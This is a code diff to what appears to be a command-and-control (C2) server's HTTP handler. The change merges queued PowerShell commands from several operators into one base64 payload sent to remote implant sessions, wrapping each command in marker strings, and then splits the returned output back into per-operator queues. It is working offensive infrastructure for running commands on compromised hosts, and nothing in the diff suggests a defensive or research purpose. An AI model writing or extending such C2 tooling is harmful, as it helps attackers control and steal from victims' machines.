@@ -276,12 +276,29 @@ class C2HTTPRequestHandler(BaseHTTPRequestHandler):
 					session.last_cmd_type = "meta"
 
 				except queue.Empty:
-					# 2) if none, pull your interactive command
-					try:
-						cmd_b64 = session.command_queue.get_nowait()
-						session.last_cmd_type = "cmd"
+					super_cmd_parts = []
+					picked_op = None
+					for op_id, q in list(session.merge_command_queue.items()):
+						try:
+							cmd_b64 = q.get_nowait()
+							# wrap only this one
+							super_cmd_parts.append(f"""
+								Write-Output "__OP__{op_id}__";
+								{base64.b64decode(cmd_b64).decode("utf-8", errors="ignore")}
+								Write-Output "__ENDOP__{op_id}__";
+							""")
+							session.last_cmd_type = "cmd"
+							picked_op = op_id
+							#break
+						except queue.Empty:
+							continue
 
-					except queue.Empty:
+					if picked_op:
+						combined = "\n".join(super_cmd_parts)
+						logger.debug(f"EXECUTING COMMAND: {combined}")
+						cmd_b64 = base64.b64encode(combined.encode("utf-8")).decode("utf-8")
+						#del super_cmd_parts[0]
+					else:
 						cmd_b64 = ""
 
 				payload_dict = {
@@ -584,7 +601,15 @@ class C2HTTPRequestHandler(BaseHTTPRequestHandler):
 
 					elif last_mode == "cmd":
 						if output_b64:
-							session.output_queue.put(output_b64)
+							pattern = re.compile(r"__OP__(?P<op>[^_]+)__(?P<out>.*?)__ENDOP__(?P=op)__", re.DOTALL)
+							decoded = base64.b64decode(output_b64).decode("utf-8", "ignore").strip()
+							for m in pattern.finditer(decoded):
+								#print(f"FOUND m in PATTERN: {m}")
+								op = m.group("op")
+								out = m.group("out").strip()
+
+								session.merge_response_queue.setdefault(op, queue.Queue())
+								session.merge_response_queue[op].put(base64.b64encode(out.encode()).decode())
 
 					else:
 						pass
